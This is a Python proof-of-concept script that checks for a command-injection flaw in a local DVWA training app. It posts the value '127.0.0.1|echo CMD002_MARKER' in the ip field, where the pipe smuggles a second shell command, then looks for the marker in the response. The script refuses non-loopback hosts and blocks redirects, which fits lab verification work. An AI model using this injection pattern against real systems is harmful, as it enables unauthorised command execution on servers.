#!/usr/bin/env python3
'''Local-only CMD-002 command-injection verification draft.

Usage:
  python3 cmd002_poc.py --url http://127.0.0.1/dvwa/vulnerabilities/exec/ --cookie 'PHPSESSID=...' --user-token '<token>'

The script refuses non-loopback hosts and does not follow redirects.
'''
import argparse
import sys
import urllib.error
import urllib.parse
import urllib.request

MARKER = 'CMD002_MARKER'


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(
            req.full_url, code, 'redirect blocked: ' + newurl, headers, fp
        )


def require_loopback(url):
    parsed = urllib.parse.urlsplit(url)
    if parsed.scheme not in ('http', 'https'):
        raise ValueError('only http/https is allowed')
    host = (parsed.hostname or '').lower()
    if host not in ('localhost', '127.0.0.1', '::1'):
        raise ValueError('only localhost/127.0.0.1/::1 is allowed')
    return url


def main():
    parser = argparse.ArgumentParser(description='CMD-002 local verification draft')
    parser.add_argument(
        '--url',
        default='http://127.0.0.1/dvwa/vulnerabilities/exec/',
        help='vulnerable page URL; loopback only',
    )
    parser.add_argument('--cookie', default='', help='authenticated Cookie header')
    parser.add_argument('--user-token', default='', help='optional CSRF token')
    parser.add_argument('--timeout', type=float, default=10.0)
    parser.add_argument(
        '--control',
        action='store_true',
        help='send a benign 127.0.0.1 request instead of the marker payload',
    )
    args = parser.parse_args()

    try:
        url = require_loopback(args.url)
    except ValueError as exc:
        print('URL_REJECTED', exc, file=sys.stderr)
        return 4

    payload = '127.0.0.1' if args.control else '127.0.0.1|echo ' + MARKER
    form = {'Submit': 'Submit', 'ip': payload}
    if args.user_token:
        form['user_token'] = args.user_token
    data = urllib.parse.urlencode(form).encode('utf-8')
    request = urllib.request.Request(url, data=data, method='POST')
    request.add_header('Content-Type', 'application/x-www-form-urlencoded')
    if args.cookie:
        request.add_header('Cookie', args.cookie)

    opener = urllib.request.build_opener(NoRedirect())
    try:
        with opener.open(request, timeout=args.timeout) as response:
            body = response.read(200000).decode('utf-8', 'replace')
            print('HTTP_STATUS', response.status)
            print('MODE', 'control' if args.control else 'marker')
            print('MARKER_OBSERVED', MARKER in body)
            index = body.find(MARKER)
            if index != -1:
                start = max(0, index - 80)
                print('OBSERVED_SNIPPET', repr(body[start:index + len(MARKER) + 80]))
            else:
                print('OBSERVED_SNIPPET', repr(body[:300]))
    except urllib.error.HTTPError as exc:
        print('HTTP_ERROR', exc.code, exc.reason, file=sys.stderr)
        return 2
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        print('REQUEST_ERROR', repr(exc), file=sys.stderr)
        return 3
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
